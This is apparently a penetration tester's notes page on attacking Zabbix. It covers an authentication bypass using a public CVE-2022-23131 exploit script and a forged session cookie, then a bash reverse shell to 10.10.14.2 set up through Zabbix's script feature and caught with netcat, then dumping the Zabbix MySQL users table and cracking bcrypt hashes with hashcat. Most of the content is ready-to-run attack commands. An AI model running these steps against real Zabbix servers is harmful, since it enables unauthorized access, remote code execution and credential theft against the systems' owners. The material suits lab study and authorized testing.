# Zabbix

<details>

<summary>V5.4 Bypass Login</summary>

### Checking if Zabbix is v5.4:

* Hover around "Help" button --> will refer to the respective zabbix version documentation

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Use [https://github.com/Mr-xn/cve-2022-23131](https://github.com/Mr-xn/cve-2022-23131)

```
python3 zabbix_session_exp.py -t https://192.168.210.13 -u admin
```

* If error "Failed to resolve \<host>" --> have to add entry to `/etc/hosts`

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Uncomment lines 60 and 62 to show the session cookies

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Rerun the command `python3 zabbix_session_exp.py -t https://192.168.210.13 -u admin`

* Copy the zbx\_signed\_session cookie and add it to the cookies for the webpage

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Press the SSO login option --> successful login

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



</details>

<details>

<summary>Reverse Shell From Zabbix</summary>

Go to "Administration" --> "Scripts" --> "Create Script"

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* Name: revshell
* Scope: Manual host action
* Type: Script
* Execute on: Zabbix server (proxy)
* Commands: `/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/80 0>&1'`
* Add

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Monitoring --> Hosts --> Zabbix server --> revshell

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

nc -lvp 80

<figure><img src=".gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Zabbix Server Configurations</summary>

`cat /usr/local/etc/zabbix_server.conf` & removing commented out lines:

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Connecting to MySQL DB for zabbix

```
mysql -h 127.0.0.1 -P 3306 -u zabbix  -p'rD...' zabbix
show databases;
use zabbix;
show tables;
select * from users;
```

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Cracking Zabbix's bcrypt hash:

```bash
hashcat -m 3200 hash.txt rockyou.txt
```

</details>
